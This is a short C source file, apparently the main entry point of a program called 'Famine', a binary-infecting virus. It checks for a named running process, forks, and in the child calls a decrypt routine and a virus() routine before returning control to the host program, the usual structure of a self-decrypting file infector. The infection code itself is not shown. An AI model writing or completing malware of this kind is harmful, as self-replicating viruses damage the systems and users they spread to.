//
// Created by Joris GOUNAND on 11/8/19.
//

#include "../inc/famine.h"

int main(void)
{
	pid_t pid;
	if (process_runing())
		exit(1);
	pid = fork();
	if (pid == 0) //children
	{
		decrypt(0,2,0,0,0);
		//write(1,"\n",1);
		virus();
		exit (0);
	}
	//jump to original
	return (0);
}